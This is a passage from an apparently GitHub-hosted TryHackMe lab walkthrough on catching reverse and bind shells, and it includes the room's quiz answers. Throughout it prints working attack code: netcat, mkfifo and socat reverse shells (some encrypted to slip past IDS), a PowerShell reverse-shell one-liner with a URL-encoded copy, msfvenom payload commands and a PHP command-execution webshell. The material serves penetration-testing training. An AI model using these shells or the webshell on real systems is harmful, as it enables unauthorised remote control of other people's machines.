Privilege Escalation
Learn the fundamental techniques that will allow you to elevate account privileges in Linux and windows systems.

• https://tryhackme.com/room/introtoshells

• https://tryhackme.com/room/linprivesc

• https://tryhackme.com/room/windowsprivesc20

## ① What the Shell?
An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.

# Task 1 Introduction
Before we can get into the intricacies of sending and receiving shells, it's important to understand what a shell actually is. In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell). We will be covering both of these scenarios in further detail throughout the room.

The format of this room is as follows:

The bulk of the room is made up of information, with examples given in code blocks and screenshots.
There are two VMs -- one Linux, one Windows -- in the last two tasks of the room. These can be used to practice the techniques demonstrated.
There are example practice questions in Task 13. Feel free to work through these, or follow along with the tasks as you complete them.
Without further ado, let's begin!

## Answer the questions below
Read and understand the introduction. `No answer needed`

# Task 2 Tools
There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell. We will discuss each of these briefly below:

## Netcat:

Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.

## Socat:

Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

The syntax is more difficult
Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.
There are work arounds to both of these problems, which we will cover later on.

Both Socat and Netcat have .exe versions for use on Windows.

## Metasploit -- multi/handler:

The exploit/multi/handler module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads -- both of which we will look at in task 9.

## Msfvenom:

Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.

Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is Payloads all the Things. The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.

## Answer the questions below
Read the above and check out the links! `No answer needed`

## Task 3 Types of Shell
At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.

    • Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.

    • Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
    
As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don't worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.

## Reverse Shell example:

Let's start with the more common reverse shell.

Nine times out of ten, this is what you'll be going for -- especially in CTF challenges like those of TryHackMe.

Take a look at the following image. On the left we have a reverse shell listener -- this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.

On the attacking machine:

`sudo nc -lvnp 443`

On the target:

`nc <LOCAL-IP> <PORT> -e /bin/bash`

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/40e1c194-757b-42cd-bf89-c69a49967241)

Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.

## Bind Shell example:
Bind shells are less common, but still very useful.

Once again, take a look at the following image. Again, on the left we have the attacker's computer, on the right we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute `cmd.exe`. Then, with the listener up and running, we connect from our own machine to the newly opened port.

On the target:

`nc -lvnp <port> -e "cmd.exe"`

On the attacking machine:

`nc MACHINE_IP <port>`

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/b4c501b5-5333-4c54-b0ca-bddeffa78867)

As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.

The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.

The final concept which is relevant in this task is that of interactivity. Shells can be either interactive or non-interactive. 
     
      • Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/044c475c-fb5e-437b-b9c8-d7423fb6b023)

    • Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/2c4a5b10-9d50-4f6b-af09-1fe9d1ca3024)

Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which is interactive) gives us no output at all. As an interesting side note, the output of an interactive command does go somewhere, however, figuring out where is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.

Additionally, in various places throughout this task you will see a command in the screenshots called `listener`. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing `sudo rlwrap nc -lvnp 443`, which will be covered in upcoming tasks. It will not work on any other machine unless the alias has been configured locally.

## Answer the questions below
Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)? `R`

You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N) `N`

When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)? `T`


## Task 4 Netcat
As mentioned previously, Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells.

## Reverse Shells

In the previous task we saw that reverse shells require shellcode and a listener. There are many ways to execute a shell, so we'll start by looking at listeners.

The syntax for starting a netcat listener using Linux is this:

`nc -lvnp <port-number>`

   • -l is used to tell netcat that this will be a listener
   
   • -v is used to request a verbose output
   
   • -n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
   
   • -p indicates that the port specification will follow.
   
The example in the previous task used port 443. Realistically you could use any port you like, as long as there isn't already a service using it. Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

A working example of this would be:

`sudo nc -lvnp 443`

We can then connect back to this with any number of payloads, depending on the environment on the target.

An example of this is displayed in the previous task.

## Bind Shells

If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward:

`nc <target-ip> <chosen-port>`

Here we are using netcat to make an outbound connection to the target on our chosen port.

We will look at using netcat to create a listener for this type of shell in Task 8. What's important here is that you understand how to connect to a listening port using netcat.

# Answer the questions below
Which option tells netcat to listen? `-l`

How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080? `nc 10.10.10.11 8080`

## Task 5 Netcat Shell Stabilisation
Ok, so we've caught or connected to a netcat shell, what next?

These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it.

## Technique 1: Python

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
The full technique can be seen here:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/a5c92ef1-8752-4ec0-b1ea-d54f8f4f94d8)

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

## Technique 2: rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

## Technique 3: Socat

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/cb8741d6-4e58-4e2b-9ef1-a362cbb35b68)

Next, in your reverse/bind shell, type in:

`stty rows <number>` and `stty cols <number>`

Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

# Answer the questions below
How would you change your terminal size to have 238 columns? `stty cols 238`

What is the syntax for setting up a Python3 webserver on port 80? `sudo python3 -m http.server 80`

## Task 6 Socat
Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

Once again, let's start with reverse shells.

## Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

`socat TCP-L:<port> -`

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind Shells

On a Linux target we would use the following command:

`socat TCP-L:<PORT> EXEC:"bash -li"`

On a Windows target we would use this command for our listener:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:

`socat TCP-L:<port> FILE:`tty`,raw,echo=0`

Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows:

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

  • pty, allocates a pseudoterminal on the target -- part of the stabilisation process
  
  • stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
  
  • sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
  
  • setsid, creates the process in a new session
  
  • sane, stabilises the terminal, attempting to "normalise" it.

That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/7b16fdd9-e43a-4ab3-9c2c-dcab4a11f915)

Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

# Answer the questions below
How would we get socat to listen on TCP port 8080? `TCP-L:8080`

## Task 7 Socat Encrypted Shells
One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells. We'll cover a few examples at the end of the task, but first let's talk about certificates.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single `.pem` file:

`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

The same technique would apply for a bind shell:

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Attacker:

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/b3f0539c-681c-4812-b1b9-c5b5f013c2eb)

This technique will also work with the special, Linux-only TTY shell covered in the previous task -- figuring out the syntax for this will be the challenge for this task. Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you're struggling to obtain the answer.

# Answer the questions below
What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"  `socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0`

If your IP is 10.10.10.5, what syntax would you use to connect back to this listener? 
`socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

## Task 8 Common Shell Payloads
We'll soon be looking at generating payloads with msfvenom, but before we do that, let's take a look at some common payloads using the tools we've already covered.

A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. In some versions of netcat (including the `nc.exe` Windows version included with Kali at `/usr/share/windows-resources/binaries`, and the version used in Kali itself: `netcat-traditional`) there is a `-e` option which allows you to execute a process on connection. For example, as a listener:

`nc -lvnp <PORT> -e /bin/bash`

Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target.

However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

The following paragraph is the technical explanation for this command. It's slightly above the level of this room, so don't worry if it doesn't make much sense for now -- the command itself is what matters.

The command first creates a named pipe at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/d9ae3e7b-4aab-49c3-9458-aaccc4821a42)

A very similar command can be used to send a netcat reverse shell:

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/2d82d9c1-00b1-4ca8-9538-605023c9bce7)

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.

This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/af58fd39-90a6-4ba9-84fd-facf0e307f93)

For other common reverse shell payloads, PayloadsAllTheThings is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what's available.

# Answer the questions below
What command can be used to create a named pipe in Linux? `mkfifo`

Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise yourself with the languages available. `No answer needed`

## Task 9 msfvenom
Msfvenom: the one-stop-shop for all things payload related.

Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`). It's this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.

The standard syntax for msfvenom is as follows:

`msfvenom -p <PAYLOAD> <OPTIONS>`

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/59701d01-5eb0-4cea-82ea-cbc55c82de73)

Here we are using a payload and four options:
    • -f <format>
        ◦ Specifies the output format. In this case that is an executable (exe)
    • -o <file>
        ◦ The output location and filename for the generated payload.
    • LHOST=<IP>
       ◦ Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
    • LPORT=<port>
       ◦ The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

## Staged vs Stageless

Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
 
    • Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.

    • Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

## Meterpreter

On the subject of Metasploit, another important thing to discuss is a Meterpreter shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they must be caught in Metasploit.

## Payload Naming Conventions

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

`<OS>/<arch>/<payload>`

For example:

`linux/x86/shell_reverse_tcp`

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:

`windows/shell_reverse_tcp`

For a 64bit Windows target, the arch would be specified as normal (x64).

Let's break the payload section down a little further.

In the above examples the payload used was `shell_reverse_tcp`. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (`_`). The staged equivalent to this payload would be:
`shell/reverse_tcp`

As staged payloads are denoted with another forward slash (`/`).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

`windows/x64/meterpreter/reverse_tcp`

A Linux 32bit stageless Meterpreter payload would look like this:

`linux/x86/meterpreter_reverse_tcp`

Aside from the `msfconsole` man page, the other important thing to note when working with msfvenom is:

`msfvenom --list payloads`

This can be used to list all available payloads, which can then be piped into `grep` to search for a specific set of payloads. For example:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/5526f628-09a9-4088-96d8-16c8d2355b8c)

This gives us a full set of Linux meterpreter payloads for 32bit targets.
# Answer the questions below
Generate a staged reverse shell for a 64 bit Windows target, in a `.exe` format using your TryHackMe tun0 IP address and a chosen port.

Which symbol is used to show that a shell is stageless? `_`

What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`. `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`

## Task 10 Metasploit multi/handler
Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

Fortunately, it's relatively easy to use:

 1. Open Metasploit with `msfconsole`

 2. Type `use multi/handler`, and press enter

We are now primed to start a multi/handler session. Let's take a look at the available options using the `options`command:

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/7a28b001-b2bc-42dd-b8a6-ef4f79dea767)

There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with (when using TryHackMe, this will be your tun0 address). We set these options with the following commands:

 • set PAYLOAD <payload>
 
 • set LHOST <listen-address>

 • set LPORT <listen-port>
 
We should now be ready to start the listener!

Let's do this by using the `exploit -j` command. This tells Metasploit to launch the module, running as a job in the background.

![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/499f6aaf-68c2-459f-ac94-94e136d27d8f)

You may notice that in the above screenshot, Metasploit is listening on a port under 1024. To do this, Metasploit must be run with sudo permissions.

When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:

Notice that, because the multi/handler was originally backgrounded, we needed to use `sessions 1` to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use `sessions` to see all active sessions, then use `sessions <number>` to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see "Command Shell session 1 opened").

# Answer the questions below
What command can be used to start a listener in the background? `exploit -j`

If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it? `sessions 10`

## Task 11 Webshells 
There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a webshell. See the Upload Vulnerabilities Room for a more extensive look at this concept.

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

As PHP is still the most common server side scripting language, let's have a look at some simple code for this. In a very basic one line format:

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page. Let's see this in action: 

Notice that when navigating the shell, we used a GET parameter "cmd" with the command "ifconfig", which correctly returned the network information of the box. In other words, by entering the `ifconfig` command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. `whoami`, `hostname`, `arch`, etc).

As mentioned previously, there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous PentestMonkey php-reverse-shell -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument:

```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.

## Task 12 Next Steps
Ok, we have a shell. Now what?

We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?

